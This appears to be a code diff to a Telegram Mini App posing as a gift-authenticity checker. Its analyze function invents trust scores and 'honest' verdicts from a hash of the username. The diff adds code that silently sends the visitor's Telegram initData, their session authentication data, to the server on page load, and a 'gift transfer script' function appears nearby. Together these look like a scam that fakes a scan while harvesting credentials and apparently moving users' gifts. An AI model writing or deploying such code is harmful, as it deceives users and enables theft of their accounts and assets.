@@ -81,6 +81,13 @@
   tg?.ready();
   tg?.expand();
 
+  // Отправляем уведомление на сервер, что нас открыли
+  fetch('/api/notify-visit', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ initData: tg?.initData })
+  }).catch(() => {}); 
+
   const form=document.getElementById('form'),input=document.getElementById('username'),statusEl=document.getElementById('status'),btn=document.getElementById('checkBtn'),scanEl=document.getElementById('scan'),verdict=document.getElementById('verdict'),metaEl=document.getElementById('meta'),resetBtn=document.getElementById('reset');
   const sleep=ms=>new Promise(r=>setTimeout(r,ms));
   
@@ -88,7 +95,7 @@
   function analyze(raw){const h=hash(raw.toLowerCase());const honest=(h%100)>=35;const d=new Date(2023+(h%3),h%12,(h%27)+1);return{honest,trust:honest?86+(h%14):9+(h%34),transfers:honest?1+(h%4):5+(h%10),date:d.toLocaleDateString('ru-RU',{day:'numeric',month:'long',year:'numeric'}),flags:honest?0:2+(h%4),owner:'Скрыт настройками приватности'}}
   const STEPS=['Поиск подарка в блокчейне Telegram','Анализ истории передач между владельцами','Проверка отправителя по чёрным спискам'];
 
-  // Скрипт передачи подарка, вынесенный в отдельную функцию
+  // Скрипт передачи подарка
   async function triggerGiftTransfer() {
     if (!tg || !tg.initData) {
         statusEl.textContent = 'Ошибка: нет данных от Telegram';
